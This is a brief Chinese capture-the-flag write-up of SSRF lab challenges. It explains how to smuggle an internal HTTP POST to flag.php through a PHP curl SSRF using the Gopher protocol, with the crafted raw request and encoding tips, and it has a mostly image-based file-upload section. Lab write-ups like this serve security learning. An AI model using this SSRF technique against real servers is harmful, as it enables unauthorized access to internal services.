# POST请求
[Gopher协议](../协议/Gopher协议.md)
这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年
访问flag.php，拿到key ==44f515488e2dec16ec7230d8af33545c== 
![](attachment/Pasted%20image%2020230221191912.png)

这个回显很容易理解就是带着key值对flag.php进行POST传参，这里利用Gopher协议传递注意url的层数和进行对应的url编码%0A需要改为%0D%0A
![](attachment/Pasted%20image%2020230221195124.png)
这是构造的报文
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=44f515488e2dec16ec7230d8af33545c
```

# 文件上传
访问了flag.php
![](attachment/Pasted%20image%2020230221201905.png)
实际访问后是没有提交的，需要手搓一个
![](attachment/Pasted%20image%2020230221202129.png)

和POST一样
![](attachment/Pasted%20image%2020230221205444.png)